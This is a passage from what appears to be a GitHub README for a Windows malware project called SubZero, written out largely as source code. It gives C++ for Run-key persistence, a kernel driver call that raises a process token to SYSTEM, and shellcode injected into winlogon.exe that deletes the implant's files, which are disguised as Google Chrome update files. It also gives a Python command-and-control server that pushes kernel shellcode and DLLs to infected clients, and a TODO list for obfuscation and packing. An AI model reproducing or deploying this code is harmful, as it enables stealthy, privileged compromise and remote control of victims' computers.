        DEBUG_PRINT(exception.what());
        SubZeroCleanup::Cleanup();
        return 1;
    }
    ...
```
Next, the file adds itself as a value to the RUN registry key. Any errors during the loading process will cleanup the malware:
```cpp
    try 
    {
        AutoRegistryKeyHandle AutoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
        RegistryManager::SetRegistryValue(AutoRegKey.get(), REG_VALUE_NAME, REG_SZ,
        (PVOID)LAUNCHER_FULL_PATH.c_str(), LAUNCHER_FULL_PATH.length() * sizeof(WCHAR));
        DEBUG_PRINT("[+] Successfully Added as RUN value");
    }
    catch (const Win32ErrorCodeException& exception) 
    {
        SubZeroCleanup::Cleanup();
        DEBUG_PRINT(exception.what());
    }
return 0;
}
```
The loader uses functions from utility classes, located at the `SubZeroUtils` project. These classes provide RAII and windows' API wrappers in order to simplify the code writing and reading experience.
An example of such class is this `RegistryManager` class:
```cpp
class RegistryManager
{
public:
    virtual ~RegistryManager() = default;

    // Delete copy constructor, assignment operator, move constructor, move operator:
    RegistryManager& operator=(const RegistryManager&) = delete;
    RegistryManager(const RegistryManager&) = delete;
    RegistryManager(RegistryManager&&) = delete;
    RegistryManager& operator=(RegistryManager&&) = delete;

    static HKEY OpenRegistryKey(HKEY hKeyRoot, const std::wstring wsSubKey);

    static HKEY CreateRegistryKey(HKEY hKeyRoot, const std::wstring wsSubKey);

    static void DeleteRegistryKey(HKEY hKeyRoot, const std::wstring wsSubKey);

    static void SetRegistryValue(HKEY hKey, const std::wstring wsValue, DWORD dwType, PVOID pData, DWORD dwSize);

    static void DeleteRegistryValue(HKEY hKey, const std::wstring wsValue);
};
```
## Cleanup  
 Both the loader and the DLL can call the malware's cleanup. Initially, there's a check whether the driver is loaded and if it is - there's another check to the current process' token. If the token isn't system's the process uses the driver to set it, then it unloads the driver:
```cpp
    // Uninstall SubZero driver if exists.
    const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
    if (ERROR_SERVICE_DOES_NOT_EXIST != ::GetLastError())
    {
        try
        {
            // If the current process is not elevated to SYSTEM, elevate it using the driver before un-installing it.
            if (!IsLocalSystem())
            {
                const AutoHandle deviceAutoHandle(::CreateFile(
                    L"\\\\.\\" DRIVER_NAME,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    0,
                    nullptr,
                    OPEN_EXISTING,
                    0,
                    nullptr));

                if (INVALID_HANDLE_VALUE == deviceAutoHandle.get())
                    finalException << DEBUG_TEXT("[-] Failed to open the device handle");

                SubZeroSetTokenToSystemData pid = ::GetCurrentProcessId();

                DWORD bytesReturned = 0;
                if (!::DeviceIoControl(
                    deviceAutoHandle.get(), // device to be queried
                    IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM, // operation to perform
                    &pid, sizeof(pid), // input buffer
                    nullptr, 0, // output buffer
                    &bytesReturned, // # bytes returned
                    nullptr))
                    {
                        finalException << DEBUG_TEXT("[-] DeviceIoControl Failed");
                    }
                    
                // Current process now will bw able to inject the PIS to winlogon.exe
                pisTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
            }    
        }
        catch (std::exception& exception)
        {
            finalException << DEBUG_TEXT(exception.what() << "\n");
        }
        
        // Driver is loaded - this function must succeed in order to continue. Any error here should be caught by the caller and handled accordingly.
        serviceManager.stopAndRemove();
    }
``` 
  >Because the driver protects the registry key and the chrome process, unloading it should be the first action of the cleanup process.
 
Next, the registry key and malicious files are deleted. Here we face another problem while trying to delete some of the files. There will always be one file that cannot be deleted - the file the we're running from. This can be `eventlog_provider.dll` in case of a remote cleanup command from the server or `GoogleUpdateClient.exe` in case of a failure in the loading process. To successfully delete these files we'll need to execute code on a different process, for that we can use the aforementioned PIS injection method. The following PIS closes the process with the PID it receives after it sleeps for 3 seconds (to give the client time to send a response to the server), then it deletes both files from the file system, even if only one of them will exist: 
```cpp
WINAPI PisStart(struct PisParameters* pisParameters)
{
    pLoadLibraryA loadLibraryA = (pLoadLibraryA)(pisParameters->loadLibraryA);
    pGetProcAddress getProcAddress = (pGetProcAddress)pisParameters->getProcAddress;
    CHAR kernel32Dll[] = { 'k','e','r','n','e','l', '3', '2','.','d','l','l','\0' };
    
    // Function names
    CHAR sleepName[] = { 'S','l','e','e','p','\0' };
    CHAR openProcessName[] = { 'O','p','e','n','P','r','o','c','e','s','s','\0' };
    CHAR terminateProcessName[] = { 'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s','\0' };
    CHAR closeHandleName[] = { 'C','l','o','s','e','H','a','n','d','l','e', '\0' };
    CHAR deleteFileAName[] = { 'D','e','l','e','t','e','F','i','l','e','A','\0' };
    
    // File paths
    CHAR launcherPath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','G','o','o','g','l','e','\\' \
    ,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','G','o','o','g','l','e','U','p','d','a','t','e' \
    ,'C','l','i','e','n','t','.','e','x','e','\0' };

    CHAR dllPath[] = { 'C',':','\\','P','r','o','g','r','a','m',' ','F','i','l','e','s','\\','G','o','o','g','l','e','\\' \
    ,'C','h','r','o','m','e','\\','A','p','p','l','i','c','a','t','i','o','n','\\','e','v','e','n','t','l','o','g','_','p','r','o' \
    ,'v','i','d','e','r','.','d','l','l','\0' };

    // Get function pointers
    HMODULE kernel32Module = loadLibraryA(kernel32Dll);
    pSleep sleep = (pSleep)getProcAddress(kernel32Module, sleepName);
    pOpenProcess openProcess = (pOpenProcess)getProcAddress(kernel32Module, openProcessName);
    pTerminateProcess terminateProcess = (pTerminateProcess)getProcAddress(kernel32Module, terminateProcessName);
    pCloseHandle closeHandle = (pCloseHandle)getProcAddress(kernel32Module, closeHandleName);
    pDeleteFileA deleteFileA = (pDeleteFileA)getProcAddress(kernel32Module, deleteFileAName);
    
    // Give the client time to send the server a response
    sleep(3000);
    
    // Terminate the calling process
    HANDLE hProcess = openProcess(PROCESS_TERMINATE, FALSE, pisParameters->pid);
    if (nullptr != hProcess)
        terminateProcess(hProcess, 1);
    
    closeHandle(hProcess);
    
    // Give the process time to terminate
    sleep(1000);
    
    // Delete files from disk
    deleteFileA(launcherPath);
    deleteFileA(dllPath);
    return 0;
}
```
In case the file deletion operation require high privileges, The decided PIS executing process needs to have these appropriate ones and is preferred to always exist and run in the background. For that, `winlogon.exe` makes a great target - it always runs as `SYSTEM` and it is present in every windows system. In order to inject the PIS to `winlogon` the current process also needs to have `SYSTEM` privileges - that is the reason for the privilege escalation done earlier.
If the escalation fails (either because the driver isn't loaded or because of an error in the `DeviceIOControl` call) the process creates a new `cmd` process and sets it as the injection target process.
The cleanup process finishes by injecting the PIS and throwing an exception log in case of an error:
```cpp
    // Setup PIS parameters
    UserPisParameters pisParameters;
    pisParameters.loadLibraryA = LoadLibraryA;
    pisParameters.getProcAddress = GetProcAddress;
    pisParameters.pid = static_cast<int>(::GetCurrentProcessId());
    
    if (nullptr == pisParamameters.getProcAddress || nullptr == pisParamameters.loadLibraryA)
        finalException << DEBUG_TEXT("[-] Invalid PIS parameters\n");
    else
    {
        // Inject PIS
        try
        {
            PISInjection::InjectPis<PisParameters>(picTargetPID, &pisParamameters, PisStart, PisEnd);
        }
        catch (std::exception& exception)
        {
            finalException << DEBUG_TEXT(exception.what() << "\n");
        }
    }
    
    // Throw full exception log if exist
    if (finalException.str().length() > 0)
        throw std::runtime_error(finalException.str());
}
```
## Server 

I tried to keep the remote server as simple as possible. The easiest way to write an HTTP server is to use python's `http` module. The server provides a basic console that the attacker can use to send a command to a remote client (the server only supports one connection at a time). After a command is entered the server builds a GET packet with the respective opcode and body and sends it to the client. Any data received in a POST packet  is printed - this could be either an error log or an output from a sent kernel PIS/DLL.

The following python code demonstrates the GET and POST request handlers:
```python
def do_GET(self):
    server_opcode = KEEP_ALIVE_OPCODE
    packet_body = b""
    returned_data_max_size = 0
    if not q.empty():
        item = q.get()
        q.task_done()
        server_opcode = item[OPCODE]
        if server_opcode != ServerOpcode.Cleanup:
            print(f"[SERVER] Sending {item[FILE_PATH]} to {self.client_address[0]}...")
        try:
            with open(item[FILE_PATH], 'rb') as file:
                packet_body = file.read()
        except:
                print(f"[SERVER] Error reading: {item[FILE_PATH]}")
                
    if server_opcode == ServerOpcode.InjectKernelShellcode:
        returned_data_max_size = item[RETURNED_DATA_MAX_SIZE]
    else:
        print(f"[SERVER] Removing client from {self.client_address[0]}...")
        
    self.send_response(200)
    self.send_header("Opcode", server_opcode)
    self.send_header("Returned-Data-Size", returned_data_max_size)
    self.end_headers()
    self.wfile.write(packet_body)
    
def do_POST(self):
    length = int(self.headers['Content-Length'])
    packet_patrameters = urllib.parse.parse_qs(self.rfile.read(length).decode('utf-8'))
    client_opcode = ord(packet_patrameters["Opcode"][0])
    
    if client_opcode != KEEP_ALIVE_OPCODE:    
        # USE match STATEMENT ON PYTHON 3.10 FOR A MORE COMPLEX SWITCH - CURRENTLY ON BETA
        if client_opcode == ClientOpcode.Success:
            print(f"[{self.client_address[0]}] Operation completed successfully.")
        else:
            print(f"[{self.client_address[0]}] Operation failed.")

        if 'Returned-Data' in packet_patrameters:
            # Handle returned data accordingly
            print(f"[{self.client_address[0]}] Returned data (String): \n{packet_patrameters['Returned-Data'][0]}")

            # In my case - PIS should return a PID
            print(f"[{self.client_address[0]}] Kernel PIS ran by PID: {ord(packet_patrameters['Returned-Data'][0])}")
```

# Execution
* Loading the driver (in debug mode):

![Loading Driver](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/LoadingDriver.png "Loading Driver")

* Closing the chrome process from task manager:

![Closing Chrome Process](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/ClosingChromeProcess.gif "Closing Chrome Process")

* Deleting the malware's registry value:

![Deleting Registry Key](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/DeletingRegistryKey.gif "Deleting Registry Key")

* Sending command from the server console and receiving results:

![Server Execution](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/ServerExecution.png "Server Execution")

# TODO List
- [ ] Use more `C++` features in the driver project
- [ ] Make the chrome-launching and the library-loading injected shellcodes position independent aswell
- [ ] Add the registry value only before shutdown/hibernation
- [ ] Obfuscate strings and add garbage code
- [ ] Pack every file saved on the file system
- [ ] Make the launched chrome.exe process more legitimate (Load known chrome libraries and create child processes)
- [ ] Encrypt files and the network between the client and server
- [ ] Support more than one client 
